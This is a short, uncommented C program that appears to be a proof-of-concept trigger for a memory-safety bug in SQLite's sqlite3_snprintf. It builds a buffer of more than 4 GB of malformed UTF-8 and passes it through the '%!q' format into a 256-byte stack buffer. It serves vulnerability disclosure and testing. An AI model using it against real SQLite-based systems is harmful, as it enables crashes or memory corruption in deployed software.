#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sqlite3.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    size_t src_buf_size = 0x100000001;

    char *src = calloc(1, src_buf_size);
    if (!src) {
        printf("bad allocation\n");
        return -1;
    }
    src[0] = '\xc0';
    memset(src+1, '\x80',  0xffffffff);

    char dst[256];
    sqlite3_snprintf(256, dst, "'%!q'", src);
    free(src);
    return 0;
}
